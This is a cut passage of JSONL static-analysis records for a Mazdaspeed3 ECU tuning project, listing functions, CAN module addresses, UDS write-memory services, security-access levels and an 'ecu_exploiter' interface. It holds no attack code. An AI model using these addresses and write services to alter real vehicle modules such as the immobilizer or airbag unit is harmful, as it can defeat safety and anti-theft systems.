None:"}, {"type": "hardware", "line": 802, "hardware": "ECU", "content": "\"\"\"Set ECU exploiter interface.\"\"\""}, {"type": "hardware", "line": 803, "hardware": "ECU", "content": "self.ecu_exploiter = ecu_exploiter"}, {"type": "hardware", "line": 804, "hardware": "ECU", "content": "self.logger.info(\"ECU exploiter interface set\")"}, {"type": "hardware", "line": 806, "hardware": "ECU", "content": "def set_database(self, database: SecureDatabase) -> None:"}], "security_logic": [{"type": "security_pattern", "line": 16, "pattern": "authorization", "content": "from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials"}, {"type": "security_pattern", "line": 176, "pattern": "password", "content": "async def login(username: str, password: str):"}, {"type": "security_pattern", "line": 182, "pattern": "password", "content": "password_hash=\"\",  # Will be validated by security core"}, {"type": "security_pattern", "line": 182, "pattern": "hash", "content": "password_hash=\"\",  # Will be validated by security core"}, {"type": "security_pattern", "line": 188, "pattern": "password", "content": "auth_result = await self.security_core.authenticate_user(username, password)"}, {"type": "security_pattern", "line": 188, "pattern": "authenticate", "content": "auth_result = await self.security_core.authenticate_user(username, password)"}, {"type": "security_pattern", "line": 219, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 244, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 269, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 305, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 341, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 384, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 418, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 447, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 476, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 511, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 541, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 603, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 630, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 663, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 696, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}, {"type": "security_pattern", "line": 725, "pattern": "authorization", "content": "credentials: HTTPAuthorizationCredentials = Depends(self.security)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazdaspeed3_tuning/__init__.py", "lines_read": 47, "features_found": [{"type": "import", "module": ".app.database.ecu_database", "line": null}, {"type": "import", "module": ".app.services.ai_tuner", "line": null}, {"type": "import", "module": ".app.services.physics_engine", "line": null}, {"type": "import", "module": ".app.services.performance_features", "line": null}, {"type": "import", "module": ".app.models.engine_models", "line": null}, {"type": "import", "module": ".app.models.turbo_models", "line": null}, {"type": "import", "module": ".utils.calculations", "line": null}, {"type": "import", "module": ".utils.security", "line": null}, {"type": "import", "module": ".core.ecu_communication", "line": null}, {"type": "import", "module": ".core.safety_validator", "line": null}, {"type": "import", "module": "Mazdaspeed3Database,", "line": null}, {"type": "import", "module": "AITuningSystem", "line": null}, {"type": "import", "module": "TurbochargerPhysics,", "line": null}, {"type": "import", "module": "AdvancedPerformanceManager,", "line": null}, {"type": "import", "module": "IdealGasPhysics,", "line": null}, {"type": "import", "module": "K04Turbocharger,", "line": null}, {"type": "import", "module": "AdvancedCalculations,", "line": null}, {"type": "import", "module": "SecurityManager", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 12, "hardware": "ECU", "content": "from .app.database.ecu_database import Mazdaspeed3Database, ECUCalibration"}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "from .utils.security import SecurityManager"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "from .core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "'ECUCalibration',"}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "'SecurityManager',"}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "'ECUCommunicator',"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "'ECUResponse',"}, {"type": "hardware", "line": 45, "hardware": "ECU", "content": "'ECUState',"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "mazdaspeed3_tuning/config/mazdaspeed3_config.py", "lines_read": 150, "features_found": [], "components_found": [], "algorithms": [], "protocols": [{"type": "protocol", "line": 92, "protocol": "0x[0-9A-Fa-f]+", "content": "'ignition_timing_base': 0xFFA000,"}, {"type": "protocol", "line": 93, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_map_primary': 0xFFA800,"}, {"type": "protocol", "line": 94, "protocol": "0x[0-9A-Fa-f]+", "content": "'boost_target_map': 0xFFB000,"}, {"type": "protocol", "line": 95, "protocol": "0x[0-9A-Fa-f]+", "content": "'vvt_intake_map': 0xFFB400,"}, {"type": "protocol", "line": 96, "protocol": "0x[0-9A-Fa-f]+", "content": "'vvt_exhaust_map': 0xFFB500,"}, {"type": "protocol", "line": 97, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limiter_soft': 0xFFB800,"}, {"type": "protocol", "line": 98, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limiter_hard': 0xFFB810,"}, {"type": "protocol", "line": 99, "protocol": "0x[0-9A-Fa-f]+", "content": "'torque_management': 0xFFBC00,"}, {"type": "protocol", "line": 100, "protocol": "0x[0-9A-Fa-f]+", "content": "'knock_learn_table': 0xFFC000,"}, {"type": "protocol", "line": 101, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_trim_adaptive': 0xFFC200"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "'ecu_address': 0x7E0,"}, {"type": "protocol", "line": 109, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm_address': 0x7E1,"}], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "vehicle", "content": "All vehicle-specific parameters and tuning limits"}, {"type": "hardware", "line": 79, "hardware": "vehicle", "content": "VEHICLE_SPECS = {"}, {"type": "hardware", "line": 91, "hardware": "ECU", "content": "ECU_MEMORY_MAP = {"}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "'ecu_address': 0x7E0,"}, {"type": "hardware", "line": 109, "hardware": "TCM", "content": "'tcm_address': 0x7E1,"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "mazdaspeed3_tuning/core/ecu_communication.py", "lines_read": 129, "features_found": [{"type": "function", "name": "__init__", "line": 33}, {"type": "function", "name": "connect", "line": 39}, {"type": "function", "name": "disconnect", "line": 59}, {"type": "function", "name": "read_sensor_data", "line": 68}, {"type": "function", "name": "write_calibration_data", "line": 108}, {"type": "function", "name": "get_state", "line": 127}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}], "components_found": [{"type": "class", "name": "ECUState", "line": 12}, {"type": "class", "name": "ECUResponse", "line": 20}, {"type": "class", "name": "ECUCommunicator", "line": 27}], "algorithms": [], "protocols": [{"type": "protocol", "line": 4, "protocol": "CAN", "content": "Handles communication with vehicle ECU via CAN bus and OBD-II protocols"}, {"type": "protocol", "line": 4, "protocol": "OBD", "content": "Handles communication with vehicle ECU via CAN bus and OBD-II protocols"}, {"type": "protocol", "line": 30, "protocol": "CAN", "content": "Placeholder for full CAN bus implementation"}], "hardware_assumptions": [{"type": "hardware", "line": 3, "hardware": "ECU", "content": "ECU COMMUNICATION MODULE"}, {"type": "hardware", "line": 4, "hardware": "ECU", "content": "Handles communication with vehicle ECU via CAN bus and OBD-II protocols"}, {"type": "hardware", "line": 4, "hardware": "CAN bus", "content": "Handles communication with vehicle ECU via CAN bus and OBD-II protocols"}, {"type": "hardware", "line": 4, "hardware": "vehicle", "content": "Handles communication with vehicle ECU via CAN bus and OBD-II protocols"}, {"type": "hardware", "line": 12, "hardware": "ECU", "content": "class ECUState(Enum):"}, {"type": "hardware", "line": 13, "hardware": "ECU", "content": "\"\"\"ECU connection states\"\"\""}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "class ECUResponse:"}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "\"\"\"ECU response data structure\"\"\""}, {"type": "hardware", "line": 27, "hardware": "ECU", "content": "class ECUCommunicator:"}, {"type": "hardware", "line": 29, "hardware": "ECU", "content": "Basic ECU communication interface"}, {"type": "hardware", "line": 30, "hardware": "CAN bus", "content": "Placeholder for full CAN bus implementation"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "self.state = ECUState.DISCONNECTED"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "def connect(self) -> ECUResponse:"}, {"type": "hardware", "line": 40, "hardware": "ECU", "content": "\"\"\"Connect to ECU\"\"\""}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "self.state = ECUState.CONNECTED"}, {"type": "hardware", "line": 45, "hardware": "ECU", "content": "return ECUResponse("}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "self.state = ECUState.ERROR"}, {"type": "hardware", "line": 52, "hardware": "ECU", "content": "return ECUResponse("}, {"type": "hardware", "line": 59, "hardware": "ECU", "content": "def disconnect(self) -> ECUResponse:"}, {"type": "hardware", "line": 60, "hardware": "ECU", "content": "\"\"\"Disconnect from ECU\"\"\""}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "self.state = ECUState.DISCONNECTED"}, {"type": "hardware", "line": 62, "hardware": "ECU", "content": "return ECUResponse("}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "def read_sensor_data(self, pids: List[str] = None) -> ECUResponse:"}, {"type": "hardware", "line": 69, "hardware": "ECU", "content": "\"\"\"Read sensor data from ECU\"\"\""}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "if self.state != ECUState.CONNECTED:"}, {"type": "hardware", "line": 71, "hardware": "ECU", "content": "return ECUResponse("}, {"type": "hardware", "line": 74, "hardware": "ECU", "content": "error_message=\"ECU not connected\","}, {"type": "hardware", "line": 81, "hardware": "vehicle", "content": "'vehicle_speed': 45.2,"}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "return ECUResponse("}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "def write_calibration_data(self, address: int, data: bytes) -> ECUResponse:"}, {"type": "hardware", "line": 109, "hardware": "ECU", "content": "\"\"\"Write calibration data to ECU\"\"\""}, {"type": "hardware", "line": 110, "hardware": "ECU", "content": "if self.state != ECUState.CONNECTED:"}, {"type": "hardware", "line": 111, "hardware": "ECU", "content": "return ECUResponse("}, {"type": "hardware", "line": 114, "hardware": "ECU", "content": "error_message=\"ECU not connected\","}, {"type": "hardware", "line": 121, "hardware": "ECU", "content": "return ECUResponse("}, {"type": "hardware", "line": 127, "hardware": "ECU", "content": "def get_state(self) -> ECUState:"}, {"type": "hardware", "line": 128, "hardware": "ECU", "content": "\"\"\"Get current ECU state\"\"\""}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "mazdaspeed3_tuning/core/safety_validator.py", "lines_read": 307, "features_found": [{"type": "function", "name": "get_safety_validator", "line": 305}, {"type": "function", "name": "__init__", "line": 37}, {"type": "function", "name": "_load_safety_limits", "line": 43}, {"type": "function", "name": "validate_tuning_parameters", "line": 91}, {"type": "function", "name": "validate_sensor_data", "line": 110}, {"type": "function", "name": "_validate_parameter", "line": 147}, {"type": "function", "name": "_check_hard_limit", "line": 161}, {"type": "function", "name": "_check_soft_limit", "line": 206}, {"type": "function", "name": "_check_rate_limit", "line": 248}, {"type": "function", "name": "get_overall_safety_level", "line": 265}, {"type": "function", "name": "should_shutdown", "line": 279}, {"type": "function", "name": "should_reduce_performance", "line": 283}, {"type": "function", "name": "get_safety_adjustments", "line": 287}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "os", "line": null}], "components_found": [{"type": "class", "name": "SafetyLevel", "line": 14}, {"type": "class", "name": "SafetyResult", "line": 22}, {"type": "class", "name": "SafetyValidator", "line": 31}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 140, "hardware": "ABS", "content": "rate_change = abs(current_value - previous_value) / (current_time - self.last_validation_time)"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "mazdaspeed3_tuning/utils/calculations.py", "lines_read": 365, "features_found": [{"type": "function", "name": "__init__", "line": 14}, {"type": "function", "name": "_initialize_constants", "line": 17}, {"type": "function", "name": "calculate_brake_horsepower", "line": 29}, {"type": "function", "name": "calculate_engine_torque", "line": 45}, {"type": "function", "name": "calculate_air_fuel_ratio", "line": 63}, {"type": "function", "name": "calculate_boost_pressure", "line": 70}, {"type": "function", "name": "calculate_pressure_ratio", "line": 83}, {"type": "function", "name": "calculate_compressor_outlet_temperature", "line": 95}, {"type": "function", "name": "calculate_turbo_mass_flow", "line": 117}, {"type": "function", "name": "calculate_exhaust_gas_temperature", "line": 140}, {"type": "function", "name": "calculate_volumetric_efficiency", "line": 171}, {"type": "function", "name": "__init__", "line": 209}, {"type": "function", "name": "_initialize_secret_methods", "line": 212}, {"type": "function", "name": "_faster_spool_technique", "line": 237}, {"type": "function", "name": "_vvt_torque_optimization", "line": 266}, {"type": "function", "name": "_ignition_knock_margin", "line": 299}, {"type": "function", "name": "_boost_taper_optimization", "line": 335}, {"type": "function", "name": "apply_tuning_secret", "line": 359}, {"type": "import", "module": "scipy", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "interpolate", "line": null}, {"type": "import", "module": "math", "line": null}], "components_found": [{"type": "class", "name": "AdvancedCalculations", "line": 11}, {"type": "class", "name": "TuningSecrets", "line": 206}], "algorithms": [{"type": "algorithm_function", "line": 29, "content": "def calculate_brake_horsepower(self, engine_torque_nm, rpm):"}, {"type": "algorithm_function", "line": 45, "content": "def calculate_engine_torque(self, imep, displacement_liters, volumetric_efficiency=0.85):"}, {"type": "algorithm_function", "line": 63, "content": "def calculate_air_fuel_ratio(self, mass_air, mass_fuel):"}, {"type": "algorithm_function", "line": 70, "content": "def calculate_boost_pressure(self, pressure_ratio, atmospheric_pressure=None):"}, {"type": "algorithm_function", "line": 83, "content": "def calculate_pressure_ratio(self, boost_psi, atmospheric_pressure=None):"}, {"type": "algorithm_function", "line": 95, "content": "def calculate_compressor_outlet_temperature(self, inlet_temp, pressure_ratio, efficiency):"}, {"type": "algorithm_function", "line": 117, "content": "def calculate_turbo_mass_flow(self, engine_rpm, engine_displacement, volumetric_efficiency,"}, {"type": "algorithm_function", "line": 140, "content": "def calculate_exhaust_gas_temperature(self, intake_temp, pressure_ratio, afr,"}, {"type": "algorithm_function", "line": 171, "content": "def calculate_volumetric_efficiency(self, engine_rpm, intake_runner_length,"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 75, "hardware": "ABS", "content": "absolute_pressure = pressure_ratio * atmospheric_pressure"}, {"type": "hardware", "line": 76, "hardware": "ABS", "content": "boost_pressure = absolute_pressure - atmospheric_pressure"}, {"type": "hardware", "line": 89, "hardware": "ABS", "content": "absolute_pressure = atmospheric_pressure + boost_pressure"}, {"type": "hardware", "line": 91, "hardware": "ABS", "content": "pressure_ratio = absolute_pressure / atmospheric_pressure"}, {"type": "hardware", "line": 160, "hardware": "ABS", "content": "timing_error = abs(ignition_timing - optimal_timing)"}], "security_logic": [{"type": "security_pattern", "line": 291, "pattern": "key", "content": "for key in adjustments:"}, {"type": "security_pattern", "line": 292, "pattern": "key", "content": "if 'advance' in key:"}, {"type": "security_pattern", "line": 293, "pattern": "key", "content": "adjustments[key] *= 1.2"}, {"type": "security_pattern", "line": 294, "pattern": "key", "content": "elif 'retard' in key:"}, {"type": "security_pattern", "line": 295, "pattern": "key", "content": "adjustments[key] *= 1.1"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "mazdaspeed3_tuning/utils/logger.py", "lines_read": 60, "features_found": [{"type": "function", "name": "get_logger", "line": 12}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Optional", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "mds1.py", "lines_read": 526, "features_found": [{"type": "function", "name": "__init__", "line": 88}, {"type": "function", "name": "connect_to_vehicle", "line": 95}, {"type": "function", "name": "_initialize_can_protocol", "line": 120}, {"type": "function", "name": "_initialize_kline_protocol", "line": 130}, {"type": "function", "name": "_initialize_mazda_can_protocol", "line": 137}, {"type": "function", "name": "_test_communication", "line": 146}, {"type": "function", "name": "start_diagnostic_session", "line": 167}, {"type": "function", "name": "read_data_by_identifier", "line": 195}, {"type": "function", "name": "write_data_by_identifier", "line": 220}, {"type": "function", "name": "read_memory_by_address", "line": 246}, {"type": "function", "name": "write_memory_by_address", "line": 278}, {"type": "function", "name": "routine_control", "line": 309}, {"type": "function", "name": "read_dtc_information", "line": 337}, {"type": "function", "name": "_parse_dtc_response", "line": 362}, {"type": "function", "name": "_bytes_to_dtc", "line": 393}, {"type": "function", "name": "_get_dtc_description", "line": 413}, {"type": "function", "name": "clear_diagnostic_information", "line": 418}, {"type": "function", "name": "send_diagnostic_message", "line": 442}, {"type": "function", "name": "_build_message", "line": 466}, {"type": "function", "name": "_send_raw_message", "line": 482}, {"type": "function", "name": "_receive_response", "line": 488}, {"type": "function", "name": "_parse_response", "line": 495}, {"type": "function", "name": "disconnect", "line": 523}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "dataclass", "line": null}], "components_found": [{"type": "class", "name": "MazdaProtocol", "line": 21}, {"type": "class", "name": "DiagnosticSession", "line": 31}, {"type": "class", "name": "SecurityAccessLevel", "line": 39}, {"type": "class", "name": "DiagnosticMessage", "line": 50}, {"type": "class", "name": "MazdaDiagnosticProtocol", "line": 60}], "algorithms": [], "protocols": [{"type": "protocol", "line": 24, "protocol": "KWP", "content": "ISO_14230_4_KWP = 2     # Keyword Protocol 2000"}, {"type": "protocol", "line": 25, "protocol": "CAN", "content": "ISO_15765_4_CAN = 3     # CAN (11-bit/500kbps)"}, {"type": "protocol", "line": 26, "protocol": "CAN", "content": "ISO_15765_4_CAN_29 = 4  # CAN (29-bit/500kbps)"}, {"type": "protocol", "line": 27, "protocol": "CAN", "content": "MAZDA_CAN_HS = 5        # Mazda High-Speed CAN"}, {"type": "protocol", "line": 28, "protocol": "CAN", "content": "MAZDA_CAN_MS = 6        # Mazda Medium-Speed CAN"}, {"type": "protocol", "line": 29, "protocol": "CAN", "content": "MAZDA_SUB_CAN = 7       # Mazda Sub-CAN systems"}, {"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "DEFAULT = 0x01"}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "PROGRAMMING = 0x02"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "EXTENDED = 0x03"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "SAFETY = 0x04"}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "MANUFACTURER = 0x40     # Mazda manufacturer session"}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_1 = 0x01          # Basic diagnostics"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_2 = 0x02          # ECU programming"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_3 = 0x03          # Parameter modification"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_4 = 0x04          # Calibration data"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_5 = 0x05          # Security system"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_6 = 0x06          # Manufacturer access"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_7 = 0x07          # Engineering mode"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "priority: int = 0x06"}, {"type": "protocol", "line": 68, "protocol": "0x[0-9A-Fa-f]+", "content": "'ENGINE_ECU': 0x7E0,"}, {"type": "protocol", "line": 69, "protocol": "0x[0-9A-Fa-f]+", "content": "'ENGINE_ECU_RESP': 0x7E8,"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "'TCM': 0x7E1,"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "'TCM_RESP': 0x7E9,"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "'ABS': 0x7E2,"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "'ABS_RESP': 0x7EA,"}, {"type": "protocol", "line": 74, "protocol": "0x[0-9A-Fa-f]+", "content": "'AIRBAG': 0x7E3,"}, {"type": "protocol", "line": 75, "protocol": "0x[0-9A-Fa-f]+", "content": "'AIRBAG_RESP': 0x7EB,"}, {"type": "protocol", "line": 76, "protocol": "0x[0-9A-Fa-f]+", "content": "'INSTRUMENT_CLUSTER': 0x7E4,"}, {"type": "protocol", "line": 77, "protocol": "0x[0-9A-Fa-f]+", "content": "'INSTRUMENT_CLUSTER_RESP': 0x7EC,"}, {"type": "protocol", "line": 78, "protocol": "0x[0-9A-Fa-f]+", "content": "'IMMOBILIZER': 0x7E5,"}, {"type": "protocol", "line": 79, "protocol": "0x[0-9A-Fa-f]+", "content": "'IMMOBILIZER_RESP': 0x7ED,"}, {"type": "protocol", "line": 80, "protocol": "0x[0-9A-Fa-f]+", "content": "'BCM': 0x7E6,"}, {"type": "protocol", "line": 81, "protocol": "0x[0-9A-Fa-f]+", "content": "'BCM_RESP': 0x7EE,"}, {"type": "protocol", "line": 82, "protocol": "0x[0-9A-Fa-f]+", "content": "'RADIO': 0x7E7,"}, {"type": "protocol", "line": 83, "protocol": "0x[0-9A-Fa-f]+", "content": "'RADIO_RESP': 0x7EF,"}, {"type": "protocol", "line": 84, "protocol": "0x[0-9A-Fa-f]+", "content": "'GATEWAY': 0x750,"}, {"type": "protocol", "line": 85, "protocol": "0x[0-9A-Fa-f]+", "content": "'GATEWAY_RESP': 0x758"}, {"type": "protocol", "line": 88, "protocol": "CAN", "content": "def __init__(self, protocol: MazdaProtocol = MazdaProtocol.ISO_15765_4_CAN):"}, {"type": "protocol", "line": 92, "protocol": "0x[0-9A-Fa-f]+", "content": "self.communication_id = 0x00"}, {"type": "protocol", "line": 102, "protocol": "CAN", "content": "if self.protocol in [MazdaProtocol.ISO_15765_4_CAN, MazdaProtocol.ISO_15765_4_CAN_29]:"}, {"type": "protocol", "line": 104, "protocol": "KWP", "content": "elif self.protocol in [MazdaProtocol.ISO_9141_2, MazdaProtocol.ISO_14230_4_KWP]:"}, {"type": "protocol", "line": 106, "protocol": "CAN", "content": "elif self.protocol in [MazdaProtocol.MAZDA_CAN_HS, MazdaProtocol.MAZDA_CAN_MS]:"}, {"type": "protocol", "line": 121, "protocol": "CAN", "content": "\"\"\"Initialize CAN protocol with Mazda-specific parameters\"\"\""}, {"type": "protocol", "line": 125, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can_tx_id = 0x7E0"}, {"type": "protocol", "line": 126, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can_rx_id = 0x7E8"}, {"type": "protocol", "line": 128, "protocol": "CAN", "content": "logger.debug(\"Initialized CAN protocol for Mazda vehicle\")"}, {"type": "protocol", "line": 133, "protocol": "0x[0-9A-Fa-f]+", "content": "self.kline_init_bytes = bytes([0x81, 0x12, 0xF1, 0x81, 0x0F])"}, {"type": "protocol", "line": 138, "protocol": "CAN", "content": "\"\"\"Initialize Mazda proprietary CAN protocol\"\"\""}, {"type": "protocol", "line": 141, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can_tx_id = 0x750  # Gateway address"}, {"type": "protocol", "line": 142, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can_rx_id = 0x758"}, {"type": "protocol", "line": 144, "protocol": "CAN", "content": "logger.debug(\"Initialized Mazda proprietary CAN protocol\")"}, {"type": "protocol", "line": 153, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 154, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x3E,"}, {"type": "protocol", "line": 155, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 174, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 175, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x10,"}, {"type": "protocol", "line": 183, "protocol": "0x[0-9A-Fa-f]+", "content": "if response.data[0] == 0x50 and response.data[1] == session:"}, {"type": "protocol", "line": 197, "protocol": "0x[0-9A-Fa-f]+", "content": "Read data by identifier (Service 0x22)"}, {"type": "protocol", "line": 202, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 203, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x22,"}, {"type": "protocol", "line": 204, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 211, "protocol": "0x[0-9A-Fa-f]+", "content": "if response.data[0] == 0x62 and response.data[1:3] == struct.pack('>H', data_identifier):"}, {"type": "protocol", "line": 222, "protocol": "0x[0-9A-Fa-f]+", "content": "Write data by identifier (Service 0x2E)"}, {"type": "protocol", "line": 229, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 230, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x2E,"}, {"type": "protocol", "line": 231, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 238, "protocol": "0x[0-9A-Fa-f]+", "content": "return response.data[0] == 0x6E and response.data[1:3] == struct.pack('>H', data_identifier)"}, {"type": "protocol", "line": 248, "protocol": "0x[0-9A-Fa-f]+", "content": "Read memory by address (Service 0x23)"}, {"type": "protocol", "line": 260, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 261, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x23,"}, {"type": "protocol", "line": 262, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 269, "protocol": "0x[0-9A-Fa-f]+", "content": "if response.data[0] == 0x63:"}, {"type": "protocol", "line": 280, "protocol": "0x[0-9A-Fa-f]+", "content": "Write memory by address (Service 0x3D)"}, {"type": "protocol", "line": 292, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 293, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x3D,"}, {"type": "protocol", "line": 294, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 301, "protocol": "0x[0-9A-Fa-f]+", "content": "return response.data[0] == 0x7D"}, {"type": "protocol", "line": 311, "protocol": "0x[0-9A-Fa-f]+", "content": "Routine control (Service 0x31)"}, {"type": "protocol", "line": 319, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 320, "protocol": "0x[0-9A-Fa-f]+", "content": 